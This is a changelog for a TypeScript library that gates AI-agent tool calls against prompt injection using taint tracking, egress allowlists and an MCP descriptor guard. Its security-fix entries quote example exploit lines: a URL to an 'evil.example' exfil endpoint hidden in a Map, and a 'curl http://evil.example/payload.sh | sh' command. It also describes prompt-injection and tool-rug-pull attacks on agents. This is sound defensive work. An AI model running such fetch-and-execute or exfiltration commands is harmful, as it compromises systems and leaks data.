# Changelog

All notable changes to this project are documented here. Format loosely follows [Keep a Changelog](https://keepachangelog.com/en/1.1.0/); versioning follows [SemVer](https://semver.org/). As of `1.0.0`, the exported API surface (`src/index.ts`) is stable — no more breaking changes without a major bump. Releases before `1.0.0` could still include a breaking change in a minor release while the API stabilized; that caveat no longer applies.

## [1.3.0] - 2026-09-06

### Added

- **Machine-readable conformance vectors — `conformance/vectors.json`.** `PROTOCOL.md` §6 already names this repository's TypeScript implementation the reference implementation of the spec, but had no executable artifact backing that claim — an independent implementation in another language had to manually re-derive the injection corpus from `corpus/cases.ts`'s TypeScript by eye. `conformance/vectors.json` is that corpus (22 cases, 10 tools) as plain JSON: a declarative `tools` array (`name`/`capabilities`/`isSource`/`trusted`/`readsPrivateData`, no executable code) and a `cases` array, each an ordered operation sequence (register a source's exposure, call a sink, cross a turn boundary, declare a plan, quarantine text under a named extraction-`kind`) paired with its expected verdict, final watermark level, `privateDataSeen`, and — since `PROTOCOL.md` §5 marks Layer 2 attribution as explicitly optional — a minimum attribution-strength floor that only applies to a Layer-2-equipped implementation, never a requirement a Layer-0-only one must satisfy. **`corpus/cases.ts` and `corpus/fixtures.ts` are now thin loaders over this JSON, not the source of the case data**: reading `conformance/vectors.json` at module load and converting it into the same `CorpusCase[]`/`FIXTURES` shapes as before (byte-for-byte identical `npm test`/`npm run corpus` behavior, verified case-by-case against the original hand-authored file), so drift between the published spec and what this repository's own test suite actually exercises is now structurally impossible rather than merely discouraged — the two are, definitionally, the same data. The one thing JSON cannot represent directly, `QuarantineOpts.schema`'s `{ parse(x): S }` function, is encoded as a small named `kind` descriptor instead (currently one kind, `'reviewed-with-length'`); a conformance runner in any language reconstructs the equivalent transform from the kind name and parameters. New `conformance/README.md` documents the JSON shape field by field for anyone writing an independent runner against it. `PROTOCOL.md` gained a new §6.1 for the full rationale; `DESIGN.md` §9 and `README.md`'s "Language-neutral specification" section were updated to match (and DESIGN.md's stale "fourteen attack classes (19 cases total)" count — one attack class and three cases behind the actual corpus — was corrected to the real fifteen/22 while touching this section). New `test/conformance-vectors.spec.ts` checks the JSON's own internal consistency (no dangling tool references, unique ids, known schema kinds) and that the TypeScript loaders genuinely derive from it rather than silently drifting back into an independent copy. Found and fixed in passing: `PROTOCOL.md` itself, linked from README.md's "Language-neutral specification" section, was missing from `package.json`'s `files` allowlist entirely — the identical "linked from the shipped README but not itself shipped" shape GAPS.md #10 already found once for `docs/classifying-tools.md` — so an installed (not cloned) copy of this package could not resolve that link either; both `PROTOCOL.md` and the new `conformance/` directory are now included, with `test/package-json.spec.ts` coverage for both.

- **Observe-only ("report-only") enforcement mode (GAPS.md #31) — `createBroker({ enforcement: 'observe' })`.** The standard adoption ramp for a hot-path enforcement mechanism (CSP report-only, a WAF's detection mode, seccomp's audit mode), for measuring GAPS.md #3's blanket-gating friction and GAPS.md #1's "forgot `isSource: true`" trigger against real traffic before ever paying either cost. `policy()` still runs and computes the exact same `PolicyDecision` `'enforce'` (the new default-preserving option value) would; the scope watermark, Layer 2 registry, and every `AuditEvent` are populated identically either way; but a `BLOCK`/`REQUIRE_APPROVAL`/`QUARANTINE_AND_RETRY` verdict no longer prevents the call — it executes anyway, audited with its TRUE, unmodified verdict via a new `AuditEvent.enforcement?: 'enforce' | 'observe'` field (stamped on every event through a single wrapping choke point at construction, `broker.ts`'s new `withEnforcementMode()`, the identical shape `redactAuditArgs` already uses). `REQUIRE_APPROVAL` never reaches a configured `approvalChannel` in observe mode — the call proceeds regardless, so a real wait would only produce a pointless notification for something that already ran; `AuditEvent.requestedAt` is correspondingly left unset for that case. Designed against the footgun such a mode invites, loudly: `createBroker({ enforcement: 'observe' })` with no `auditSink` **refuses to construct** (new `ObserveModeRequiresAuditSinkError` — a broker that never gates and has nowhere to record what it would have gated is strictly worse than the ordinary silent-`NOOP_AUDIT` default, GAPS.md #25); a one-time, loud `__tttb_observe_mode_warning` `AuditEvent` is recorded at construction before any real call; and every observed-but-not-enforced event carries the checkable signature `enforcement: 'observe'` + a non-`ALLOW`/`ALLOW_WITH_WARNING` verdict + `executed: true`, which `src/debug.ts`'s `formatAuditTrail()` now renders with an explicit `[OBSERVE MODE: NOT ENFORCED]` marker and `AggregatingAuditSink.snapshot()` now counts as `observeMode.wouldHaveGated`. **Deliberately does NOT relax** plan-freeze (`declarePlan()`, §11) or the `allowedOutboundHosts` egress allowlist (§7.4) — both are structural checks inside `gateDecision()` that reject before `policy()` is ever consulted, so `UnplannedPrivilegedActionError`/`DisallowedOutboundHostError` throw exactly as under `'enforce'`, completely unaffected — nor `broker.summarize()`'s own input-provenance checks, which have no `sinkClass` to observe at all. `checkBrokerConfig()` (GAPS.md #30's `doctor` preflight) gained a `'observe-mode-active'` `'warning'`-level finding for the subtler case of a config with a real `auditSink` that is still non-enforcing. `ToolCallBroker.enforcement` (new readonly getter) and `EnforcementMode` (new exported type) round out the public surface. Purely additive: every new field/option is optional, defaults preserve today's behavior exactly, and a broker constructed without `enforcement` behaves exactly as it always has. `test/enforcement.spec.ts` covers construction guards, the startup event, all three overridden-verdict shapes, the approval-channel skip, the structural-checks-stay-enforcing guarantee, and the debug.ts renderer/counter additions; `test/doctor.spec.ts` covers the new finding.

- **A `doctor` CI preflight over a tool catalog and broker config (GAPS.md #30) — a new `bin` entry, `tttb doctor`.** Every misclassification/config-inertness advisory this library already ships — `warnOnLikelyUnmarkedSource`/`warnOnLikelyUnclassifiedSink`/`warnOnLikelyDestinationKeysMismatch` (GAPS.md #1/#10/#18), a silent no-op `auditSink` (GAPS.md #25), an unconfigured `quarantineImpl`, `requireQuarantineSchema` left off (GAPS.md #4), an `EXFIL`-capable tool with no `allowedOutboundHosts` (GAPS.md #18) — only ever fires through a LIVE `Broker` instance. `src/doctor.ts` (`checkToolCatalog()`, `checkBrokerConfig()`, `runDoctor()`, `formatDoctorReport()`, all re-exported from `src/index.ts`) packages the mechanical half of these into pure functions runnable before a broker is ever constructed, plus two genuinely new, DETERMINISTIC checks a live broker doesn't merely warn about but rejects outright: a dual-role tool (`isSource: true` + non-empty `capabilities`, `DualRoleToolError`) and a reserved `__tttb_`-prefixed tool name (`ReservedToolNameError`) — both caught statically, so the introducing commit fails CI instead of the first real `register()` call. `npx tttb doctor <path-to-config.js>` (`src/cli/doctor.ts`, this package's first and only `bin` entry, `package.json`) is a thin CLI wrapper around the same functions for a config living in a plain, already-built JS module (this package ships no TS-compilation step for consumer code) exporting `tools`/`brokerConfig`; `--strict` also fails the exit code on a `'warning'`-severity finding, not just `'error'`. Calling the three functions directly from your own CI test suite works identically and needs no CLI at all. Same honesty bar as everywhere else in this codebase: the keyword-based catalog check reuses `likelyUnclassifiedSinkKeyword()` verbatim and inherits its exact blind spot (a deliberately-deceptive tool, or one whose real behavior doesn't show up in its name) by construction — the two deterministic registration-rejection checks are the only genuinely new coverage here, not a verification capability this library didn't have before. `docs/classifying-tools.md` gained a new "A packaged `doctor` preflight" section; README.md gained a "Doctor CLI" section. New: `scripts/smoke-test-doctor-cli.mjs` (wired into both `ci.yml` and `release.yml`, mirroring `smoke-test-dist.mjs`'s own rationale but for this SEPARATE shipped bin artifact), `test/doctor.spec.ts`, `test/cli-doctor.spec.ts`.

- **The source-class axis (GAPS.md #28)** — `TaintLevel` orders trust *degree*; nothing previously let an integrator express *why* a source is untrusted, so an internal MCP server and a random fetched web page were policy-indistinguishable the instant either raised the watermark. `ProvenanceTag.sourceClass` (`src/types.ts`) is a new, free-form, integrator-defined origin-type label, threaded from a new `ToolExecutor.sourceClass` (declared per source tool, like `isSource`/`trusted`) and from `markContextExposure()`/`markToolDescriptionExposure()`/`markSystemPromptExposure()`/`markPastedContentExposure()`'s own new optional `sourceClass` parameter (GAPS.md #1's escape hatches). `TaintContext.sourceClasses` (new, optional field) surfaces the distinct classes contributing to the CURRENT scope's watermark, deduplicated via a new exported pure helper, `deriveSourceClasses()` (`src/taint/scope.ts`, re-exported from `src/index.ts`) — computed at every real `TaintContext` construction site (the live gating path, the `ArgsTooDeepError` audit path, every administrative event via `internal-audit.ts`'s widened `trivialTaintContext()`, and both `quarantine.ts` audit sites), including turn-reset/`declassify()` events, which correctly report the DISCARDED watermark's source classes, not the fresh scope's. A quarantined/derived record inherits its source record's `sourceClass` (it's a condensation of that same origin, not a new one). `createTaintEnvelope()` carries `sourceClasses` through too, for the same "describes `value`'s own exposure story" reason it already carries `scopeLevel`/`privateDataSeen`/`scopeId`. **`defaultPolicy` deliberately never reads this field or `sourceClass`** — consistent with GAPS.md #10's "integrator declares, library enforces" split applied everywhere else in this codebase, this ships the plumbing only; a custom `PolicyFn` decides what (if anything) to do with it. See `examples/source-class-policy.ts` (`npm run example:source-class-policy`) for a worked pattern — downgrading `REQUIRE_APPROVAL` to `ALLOW_WITH_WARNING` only when every contributing source is a reviewed `'internal-mcp'` class, falling through to `defaultPolicy` unchanged the moment any other class (including an unclassified source) is also in scope. Purely additive: every new field is optional, every new parameter is a trailing optional one, and a broker/tool/call that declares no `sourceClass` anywhere behaves exactly as it did before this shipped. `test/source-class.spec.ts` and `test/source-class-policy-example.spec.ts` cover the derivation, propagation, and worked-example behavior.

- README.md's Core model section gained a `createToolDescriptorGuard(broker)` bullet — PR #56 promoted it from example-only glue to an exported core capability, but README wasn't updated at the time (only the agent working on `requireQuarantineSchema` was asked to touch README; the tool-descriptor-guard agent wasn't). The `example:mcp` Examples-table row was updated to match, naming the exported function instead of describing it only as "a tool-description rug-pull guard."

## [1.2.0] - 2026-09-01

### Added

- **`createToolDescriptorGuard()` — the MCP tool-descriptor rug-pull guard promoted from example glue into a reusable, exported core-library capability** (`src/tool-descriptor-guard.ts`; `ToolDescriptor`/`createToolDescriptorGuard` re-exported from `src/index.ts`). `examples/mcp-integration.ts` and `examples/mcp-sdk-integration.ts` each used to define their own byte-for-byte-identical `createMcpDescriptionGuard()`/`checkDescriptions()` closure for GAPS.md #1's own canonical example — hashing a tool's description at each discovery call and calling `broker.markToolDescriptionExposure()` when it changes since last seen. That logic is now one tested, importable function both examples import instead of redefining, and it closes a real gap the description-only original had: it hashes a tool's FULL descriptor — `name`, `description`, AND its input/parameter JSON schema when present, via this library's own `exactHash()`/`toRegistrableText()` — not description text alone, since a schema is exactly as attacker-controlled as a description once you're talking to an MCP server. On a detected change it calls `broker.markToolDescriptionExposure()` — `ALLOW_WITH_WARNING` plus a taint raise, the same warn-and-taint shape every other advisory heuristic in this library already uses, never a hard deny. See GAPS.md #1's own new paragraph and DESIGN.md's matching implementation note for the full detail, including this guard's documented known limitations.
- **`BrokerOptions.requireQuarantineSchema` — a new opt-in strict mode converting GAPS.md #4's documented schema-discipline into an enforced guarantee** (`src/broker.ts`, `src/quarantine.ts`, new `QuarantineSchemaRequiredError` in `src/errors.ts`/re-exported from `src/index.ts`). `broker.summarize()`'s `opts.schema` is optional and defaults to unconstrained free text (`S = string`) — GAPS.md #4 already documented at length why a wide-open schema quietly reintroduces much of the risk the `DERIVED_UNTRUSTED` tier exists to reduce, but nothing stopped a call site (an integrator's own, or a teammate's) from simply omitting it. `requireQuarantineSchema: true` closes that: a schema-less `summarize()` call is now rejected with `QuarantineSchemaRequiredError`, audited as a `BLOCK` via the same `recordTrivialAudit()` helper and shape the sibling `QuarantineInputUnknownError`/`QuarantineInputMismatchError` rejection paths already use, before the Q-LLM is ever invoked and before anything reaches the taint registry — a rejected call fails closed, not partially. Mirrors `declarePlan()`'s plan-freeze strict mode (DESIGN.md §11) in spirit: additive on top of the default permissive behavior, off by default, and it changes nothing for a call that already provides `opts.schema` or for a broker that doesn't opt in. See GAPS.md #4's new paragraph and DESIGN.md §6.2's matching implementation note; new `test/broker.spec.ts` coverage (a dedicated `requireQuarantineSchema` describe block) proves the unset/false case is byte-for-byte unchanged, the rejection's audit shape matches its siblings, the taint registry and watermark are untouched by a rejected call, and a schema-provided call is unaffected — verified to fail with a clean mismatch when the new check was temporarily neutered, and pass once restored.
- **DESIGN.md §2 (Prior Art & Positioning) extended with four systems it previously didn't name: FIDES (Microsoft Research), Progent (UC Berkeley/UCSB/NUS), RTBAS (Carnegie Mellon), and FORGE (Wisconsin/Cornell/Langroid)** — all real, verifiably-attributed 2025/2026 papers enforcing agent-tool-call policy outside the model via information-flow labels (FIDES, RTBAS) or capability/reference-monitor policies (Progent, FORGE), researched via web search (not written from training-data recall alone) and each given one sentence naming the most relevant concrete difference from this library's own single-scalar-watermark, no-policy-DSL approach. Also adds a new closing paragraph naming AgentDojo (Debenedetti et al., NeurIPS 2024 — the benign-utility/utility-under-attack/attack-success-rate benchmark FIDES/Progent/RTBAS all report against) and citing a specific, verified adaptive-attack finding (Zhan, Fang, Panchal & Kang, NAACL 2025 Findings, arXiv:2503.00061 — eight earlier AgentDojo-evaluated defenses bypassed via adaptive attacks, consistently exceeding 50% attack success rate) as context for GAPS.md's new #29. Deliberately does NOT claim an adaptive-attack number for FIDES/Progent/RTBAS/FORGE specifically (that paper predates and did not evaluate them), and flags FORGE's own AgentDojo-evaluation claim as unconfirmed rather than asserted, since the research pass could not independently verify that specific detail — accuracy over completeness, since this is public documentation about other named projects.

## [1.1.0] - 2026-08-31

### Added

- **`PROTOCOL.md` — the underlying taint-tracking model, published as a short, versioned, language-neutral specification document, separate from the TypeScript implementation** (repository root; cross-referenced from `README.md`'s new "Language-neutral specification" section and `DESIGN.md` §8). This is a TypeScript/Node-only library, but the model itself — the taint lattice and its monotonicity/raise-before-read-atomicity requirements (DESIGN.md §4.0/§4.1), the sink-class taxonomy and default policy decision table including the `privateDataSeen` escalator-not-gate rule (§7), the quarantine/`summarize()` sanctioned path's input-provenance and who-registers-the-output rules (§6.2), and the audit-event minimum shape and completeness requirement (§4.1's audit-completeness note) — doesn't need to be TypeScript-only to be useful as a reference for someone implementing or evaluating this model in a different language or runtime (Python and other agent-framework ecosystems being largely Python-first was the concrete motivation). A full cross-language port was considered and deliberately rejected: this is a security-critical library maintained by one person (`SECURITY.md`/`CONTRIBUTING.md`), and forking its subtle, adversarially-hardened correctness properties across two languages would double the real attack surface one maintainer has to hold correctly, not just the line count. Publishing the model as a specification — written in pseudocode/tables/prose, not TypeScript syntax, cross-checked against `src/types.ts` (authoritative for shape per DESIGN.md §8) rather than only against DESIGN.md's prose — lets an independent implementation exist, owned by someone else, without this repository taking on a second security-critical codebase. `PROTOCOL.md` states explicitly that Layer 2 (fingerprint/content-attribution matching — exact-hash/simhash/shingle) is optional and never load-bearing for the core gate: a conformant implementation could ship Layer 0 (the watermark) alone and be sound, just less precise in its explanations — the single most consequential scoping decision for a new-language implementation with a different available library ecosystem. Includes a Conformance section naming this repository the reference implementation and stating that a change to `PROTOCOL.md`'s normative content should be treated with the same SemVer/changelog rigor as a public-API-shape change (README.md's "Versioning" section).
- **`serializeAuditEvent()` — fixes a confirmed production footgun: `JSON.stringify(event)` throws on the most obvious `AuditSink` implementation** (`src/persistence.ts`, also exported from `src/index.ts`; `src/types.ts`'s `AuditSink` doc comment, DESIGN.md §4.2, GAPS.md #12, README.md's Core model section). `AuditEvent.taint.matchedRecords[].record.fingerprint` carries `simhash: bigint` and `shingleHashes: Uint32Array` — the same two fields `src/persistence.ts` already had to convert for cross-process registry export — but an `AuditEvent` reaches an integrator's `AuditSink` on every gated call regardless of whether they ever touch registry persistence. Confirmed directly: `record(e) { console.log(JSON.stringify(e)) }`, the single most obvious `AuditSink`, or any JSON-based log shipper (pino, Winston-JSON, a Datadog/CloudWatch agent), THROWS `TypeError: Do not know how to serialize a BigInt` the moment a call's arguments fuzzy- or exact-match a previously-registered record — the ordinary case for a real attack, not an edge case. `serializeAuditEvent(event)` converts `event` to a JSON-safe value, reusing the identical per-`TaintRecord` conversion `serializeRegistry()` already uses (factored into a shared private helper so the two can't drift apart) — `JSON.stringify(serializeAuditEvent(event))` is the fix. Purely additive: `AuditEvent`'s own type shape is unchanged (no breaking change to the just-stabilized 1.0.0 public API), and this is an opt-in converter for an integrator's own `AuditSink.record()`, not a change to what's already there. New `test/audit-json-safety.spec.ts` constructs a real fuzzy-matched `AuditEvent` via an actual `broker.call()` sequence (not a hand-built object), confirms `JSON.stringify()` on the raw event still throws (pinning the bug itself), and confirms `JSON.stringify(serializeAuditEvent(event))` succeeds and round-trips `simhash`/`shingleHashes` correctly.
- **`BrokerOptions.warnOnLikelyDestinationKeysMismatch` — a new opt-in advisory heuristic for GAPS.md #18's "destinationKeys assumes a fixed, singular destination key per tool" sub-bullet** (`src/broker.ts`, `src/types.ts`'s `ToolExecutor.destinationKeys` doc comment already named this as the assumption; `src/taint/egress.ts`, GAPS.md #18, DESIGN.md §7.4). `destinationKeys` is documented as a fixed property of a tool's own schema — but a real tool's destination-carrying argument name can still vary by call shape (a generic `notify` tool whose destination lives under `slackUrl` for one call and `emailAddress` for another). An integrator who declares `destinationKeys: ['slackUrl']` for such a tool doesn't just narrow the scan imperfectly for the other shape — it silently exempts that call's real destination from `allowedOutboundHosts` entirely, and since that allowlist is often the SOLE check standing between an otherwise-policy-permissive (`CLEAN`) scope and a real network egress, this can be a complete, silent removal of the only check, with nothing in the audit log hinting anything is missing. Mirroring the existing `warnOnLikelyUnmarkedSource`/`warnOnLikelyUnclassifiedSink` heuristics (GAPS.md #1/#10) exactly: purely advisory, never blocking, never changing what's registered or the actual gating decision. When enabled, a call to a tool declaring a non-empty `destinationKeys` that has already cleared the real `allowedOutboundHosts` gate (never one already `BLOCK`ed by it — that call already has its own `BLOCK` audit event) is additionally scanned, via the new `findOutboundDestinationsOutsideKeys()` (`taint/egress.ts`, also exported from `src/index.ts`), for a URL- or email-shaped value anywhere in its argument tree OUTSIDE every subtree named by `destinationKeys`; if found, an `ALLOW_WITH_WARNING` `AuditEvent` names the exact offending argument path. New `test/broker.spec.ts` coverage (a dedicated `warnOnLikelyDestinationKeysMismatch` describe block) proves the advisory fires only when enabled and only outside the declared subtree, and — the safety-critical assertion — that the underlying `allowedOutboundHosts` gating decision (ALLOW or BLOCK) is completely unaffected either way; new `test/egress.spec.ts` unit coverage exercises the new tree walk directly (path-tracking, arrays, `Map`/`Set`, cyclic-safety, `ArgsTooDeepError`).
- **`fast-check` added as a devDependency, plus new property-based test files (`test/fingerprint.property.spec.ts`, `test/json-safe-clone.property.spec.ts`, `test/counterfactual-diff.property.spec.ts`), targeting the exact bug SHAPE this project has already shipped twice: a Unicode/invariant-violation bug in a pure function, caught by adversarial review rather than the test suite** (GAPS.md #8; see this section's own `exactHash()`/`normalize()` entry below for the two historical bugs). Both were, in hindsight, textbook property-based-testing failures — an invariant violated by an input class nobody happened to hand-write an example for (a lone/unpaired UTF-16 surrogate; text made entirely of punctuation/symbols/emoji that `normalize()` reduces to nothing). Rather than relying on `fc.string()`'s own default distribution — which rarely produces a lone surrogate on its own, and gives punctuation-/emoji-only output little weight — every new arbitrary is deliberately WEIGHTED toward those two proven classes (explicit lone-surrogate injection, symbol-only/emoji-only/whitespace-only text) alongside the general case. Coverage: `exactHash()` never collides two distinct strings (including strings differing only in which lone surrogate they embed — the exact historical repro, generalized); `overlapCoefficient()` is always in `[0, 1]`, symmetric, exactly `1` for identical non-empty input, and scores a verbatim-embedded substring as nonzero overlap with its container (the containment property `fingerprint.ts`'s own module doc comment claims, deliberately generated wide enough — `>= SHINGLE_WIDTH` words — to stay clear of GAPS.md #8's own separate, still-open short-excerpt false-negative); `jsonSafeClone(x)` deep-equals `x` and never returns a value reference-equal to any object reachable from `x`, for arbitrary JSON-safe trees; `diffProposedArgs(x, x)` and `diffProposedArgs(x, structuredClone(x))` are always empty, for a wide bug-class-biased space of generated trees, not just `test/counterfactual-diff.spec.ts`'s hand-picked examples. All run as plain `fc.assert(fc.property(...))` inside ordinary vitest `it()` blocks — fast-check's own first-class integration point — so they execute inside the normal `npm test` output rather than a separate harness. Verified to actually have teeth, not just to pass: the `exactHash()`/lone-surrogate fix in `escapeLoneSurrogatesForHashing()` was temporarily reverted to its pre-fix behavior, confirmed the new property test failed with a clean, fast-check-shrunk counterexample (`'\uD800'` vs `'\uD801'`), then the revert was undone and the suite re-confirmed green.
- **`ToolCallBlockedError` now carries the `TaintContext` (`readonly taint`) that was actually computed for the blocked decision** (`src/errors.ts`, `src/broker.ts`'s `finalizeGated()`). Previously the error carried only `call` and `decision` (the policy's verdict/reason) — the `TaintContext` `finalizeGated()` had already built for this exact decision (`matchedRecords`, `argPath`s, `scopeLevel`, `privateDataSeen`) was computed, used to reach the verdict, recorded on the corresponding `AuditEvent.taint`, and then simply discarded rather than attached to the thrown error. An integrator's `catch` block had no way to see WHICH upstream content actually drove a block without separately wiring an `AuditSink` and correlating its events back to the call by `call.id` — exactly the correlation step a self-explanatory error should not require. Every throw site (there is exactly one, in `finalizeGated()`) now passes the same `auditTaint` already used to build that call's `AuditEvent`, so `err.taint` and the matching audit record's `taint` are always the identical object. **Not typed optional** — unlike a field added to a public interface (`TaintContext`, `AuditEvent`, `PolicyDecision`, ...), `ToolCallBlockedError` is a concrete class only ever constructed inside this library, never a shape external code structurally implements, so there is no pre-existing external construction site a required field could break. New `test/broker.spec.ts` coverage constructs a real tainted-source-then-blocked-sink scenario (not a hand-built error) and asserts directly on `err.taint.matchedRecords`/`argPath`/`scopeLevel`, verified to fail with a clean `TypeError` pre-fix (`taint` was `undefined`) and pass post-fix.
- **`test/concurrency-stress.spec.ts` — a randomized, seeded concurrency-stress harness for `Broker.withLock`'s reentrancy-guard and barrier-exemption dispatch path** (DESIGN.md §4.1's new "a randomized concurrency-stress harness" implementation note). Every concurrency race this project has ever found and fixed (§4.1) was located by a human hand-constructing one specific interleaving, then pinned with a regression test for exactly that shape — sound for closing a *known* race, definitionally blind to one nobody has thought to construct yet. This harness instead: a hand-written seedable PRNG (`mulberry32`, no new dependency) generates a random sequence of tool-call actions from a pool covering every dispatch-path shape §4.1 discusses (an untrusted source, an EXEC sink, an EXFIL sink, a barrier-exempt pure-utility tool, a `readsPrivateData` NONE-sink tool, and a `mayCallSummarize: true` composite tool calling `broker.summarize()` internally), each given a randomized artificial delay; dispatches the whole sequence through one broker via `Promise.allSettled`; and checks the result against structural invariants (watermark monotonicity across the audit log, a gated call never executing against a watermark state diverging from its own audit record, no dropped/double-recorded audit events, no reentrancy-guard deadlock, an exempt call never queueing behind a slow gated one) instead of a fixed expected outcome, across 110 independently-seeded runs. Every invariant-violation failure message embeds the exact seed and full action sequence for a one-screen local reproduction. The harness's bug-finding power was verified directly: `revalidateBeforeExecute()`'s checkpoint (§4.1's "a stale gating decision could still execute" fix) was temporarily neutered, 75/110 seeds immediately failed with a clear audited-state-vs-actual-state mismatch, and the edit was reverted with the suite reconfirmed green.

### Security

- **`findOutboundHosts()` (`taint/egress.ts`) — the scan backing `BrokerOptions.allowedOutboundHosts`, documented in DESIGN.md §7.4 as a hard structural boundary ("traffic from this deployment never leaves to a host I haven't approved, full stop") — was structurally blind to a destination hidden inside a `Map` or `Set` anywhere in a call's argument tree, silently bypassing the allowlist entirely for that shape.** Its `visit()` walk handled `Array.isArray(node)` explicitly but fell back to `Object.entries(node)` for everything else, which returns zero entries for a `Map` or `Set` (their entries live in an internal slot, not an own-enumerable property) — no error, no `ArgsTooDeepError` trip, just silently zero hosts found. Confirmed by direct exploitation, not just reasoned about: `broker.call('net_post', { headers: new Map([['url', 'https://evil.example/exfil']]) })` executed successfully against an allowlist of only `['approved.example']`. This is the exact same failure mode `scanArgsForTaint()`'s mandatory pre-dispatch scan already had and already fixed (`[0.3.0]` below) — `findOutboundHosts()` was simply never given the same fix. Fixed with the same explicit `Map`/`Set` traversal branches, inserted at the identical relative position (after the array check, before the generic-object fallback), walking a `Map`'s keys AND values (a Map key is ordinary data, just as plausible a place to smuggle a destination as its value slot — unlike a plain object's fixed property name) and a `Set`'s values, and correctly respecting whichever `destinationKeys` scoping mode (whole-tree or narrowed) is active at that point in the walk. New `test/egress.spec.ts` coverage reproduces the exact exploit above end-to-end via `broker.call()` (a URL hidden in a Map value, a Map key, and a Set value, each correctly rejected with `DisallowedOutboundHostError`), a true-negative case (an allowlisted host inside a Map/Set is not blocked), and the `destinationKeys` interaction (a Map/Set under a declared destination key is still scanned; one outside it stays exempt). GAPS.md #18 and DESIGN.md §7.4 updated.
- **`jsonSafeClone()` (`src/json-safe-clone.ts`, GAPS.md #16's opt-in fast alternative to the default `structuredClone`-based args cloner) corrupted a clone's actual prototype instead of copying a source object's own key literally named `"__proto__"`.** Its output-building loop used a plain bracket assignment (`out[key] = clonedValue`) for every key; for a source object carrying a genuine own, enumerable `"__proto__"` property (via computed-property syntax or `Object.defineProperty` — not the object-literal `__proto__:` shorthand, which sets a prototype rather than creating one), that assignment hit `Object.prototype`'s inherited `__proto__` accessor SETTER on the fresh output object instead of creating an own property, silently reassigning the clone's real prototype rather than faithfully copying the key. Found by `test/json-safe-clone.property.spec.ts` (added earlier in this release) shrinking to exactly this input shape on the "idempotent under re-cloning" property — the corrupted first clone then failed the second clone attempt's plain-object check entirely. Fixed by using `Object.defineProperty()` for every key, `"__proto__"` included, which always creates/overwrites an own data property regardless of key name. New regression coverage in `test/json-safe-clone.spec.ts` pins this exact shape directly, verified fail-before/pass-after via `git stash`. Narrowly scoped — `jsonSafeClone()` is opt-in, not the default cloner, and required a specifically-crafted source key to trigger — but a real, previously-undetected prototype-integrity defect, so it's recorded here rather than folded silently into `### Fixed`. GAPS.md #26 added.

### Fixed

- **A `REQUIRE_APPROVAL` call denied because `BrokerOptions.approvalChannel` was never configured at all was indistinguishable, in both the thrown `ToolCallBlockedError` message and the recorded `AuditEvent.verdict.reason`, from one a real, correctly-configured `approvalChannel` actively evaluated and denied** (`src/broker.ts`'s `finalizeGated()`; GAPS.md #20, DESIGN.md §7.3). Omitting `approvalChannel` is a supported, fail-SAFE configuration — such a call is correctly treated as denied, never `ALLOW` — but `dispatchGated()` forces `approvedByHuman: false` for both "no channel to ask" and "a channel said no" identically, and the audited/thrown text used to be built from the plain policy `reason` either way, with nothing naming which of the two actually happened. A confirmed production debugging trap: an operator reading a "denied" audit-log entry from a broker that was simply never wired up with an `approvalChannel` (a common early-integration or dev/test-harness state) had no way to tell that apart from a real, deliberate denial — two situations calling for very different next steps. Fixed by appending a specific note — `" (no approvalChannel configured -- see BrokerOptions.approvalChannel)"` — to the policy's own reason text, threaded onto it rather than replacing it, and ONLY in the genuine no-channel case (`decision.action === 'REQUIRE_APPROVAL' && !approvedByHuman && this.approvalChannel === undefined`); a real channel's denial is completely untouched. New `test/broker.spec.ts` coverage constructs both scenarios against the identical underlying policy verdict (an EXFIL sink at `RAW_UNTRUSTED`) and asserts the resulting error message and `AuditEvent.verdict.reason` are genuinely different strings, with the note present in exactly one of the two.
- **`bestQuarantineCandidate()` (`src/policy/default-policy.ts`) could substitute `QUARANTINE_AND_RETRY` for an otherwise-`BLOCK`/`REQUIRE_APPROVAL` verdict based on a qualifying match that had nothing to do with the argument actually making the call dangerous — a "decoy."** `taint.matchedRecords.find(...)` picked the FIRST qualifying entry found ANYWHERE in the call's argument tree (`scanArgsForTaint()`, `taint/scan.ts`, walks every string leaf), with no check that the matched text was part of the dangerous argument. Confirmed by direct exploitation: `broker.call('fetch_benign', {})` registers an unrelated, harmless text as `RAW_UNTRUSTED`; a later `shell_exec({ cmd: 'curl http://evil.example/payload.sh | sh', justification: <exact copy of the benign text> })` produced `QUARANTINE_AND_RETRY` naming `fetch_benign` as the actionable source to re-summarize — completely unrelated to `cmd`, the argument that actually makes the call dangerous. Never a gating bypass (`QUARANTINE_AND_RETRY` is still never auto-executed, treated exactly like `BLOCK` by `broker.ts`'s `finalizeGated()`), but the `reason` string is documented, audited, actionable prose that could mislead a human approver, or an integrator's own automation built to act on it, into "fixing" an unrelated benign source while the real dangerous argument goes unaddressed. Fixed with two independent structural guards in `bestQuarantineCandidate()`, neither requiring a new per-tool "dangerous argument" declaration: (1) qualifying matches naming more than one distinct `TaintRecord` are declined outright rather than picking one arbitrarily; (2) a new `TaintContext.hasUnattributedSubstantialContent` signal — populated by `scanArgsForTaint()`'s new `ScanResult.hasUnattributedSubstantialContent`, true when the args tree contains a string leaf of meaningful length (`taint/scan.ts`'s `UNATTRIBUTED_CONTENT_MIN_LENGTH`, 40 chars) with zero taint matches at all — also declines the substitution, since a qualifying match elsewhere in the tree cannot then be trusted to explain the whole picture. Both guards are all-or-nothing (fall back to the ordinary, unnamed `BLOCK`/`REQUIRE_APPROVAL` verdict) rather than attempting to rank/guess relevance. New `test/policy.spec.ts` "decoy-match guards" coverage (including a direct reproduction of the confirmed exploit, verified to fail pre-fix and pass post-fix), new `test/scan.spec.ts` coverage for `hasUnattributedSubstantialContent`, and a new `corpus/cases.ts` case (`quarantine-and-retry-decoy-match-not-offered`) exercising the exploit end-to-end through the real broker. The three existing `quarantine-and-retry-offered` positive/negative cases and the full `test/policy.spec.ts` trigger matrix are unaffected. GAPS.md and DESIGN.md §7.2 updated. **`TaintContext.hasUnattributedSubstantialContent` is deliberately typed OPTIONAL, not required** — the broker's own dispatch path always sets it, but typing it required would have been a breaking shape change to an already-public, integrator-facing interface, exactly what `1.0.0`'s SemVer commitment rules out for anything short of a major bump; `bestQuarantineCandidate()` treats `undefined` the same as `true` (the conservative direction) so a pre-existing hand-built `TaintContext` fixture still type-checks and still gets the safe behavior.

### Added

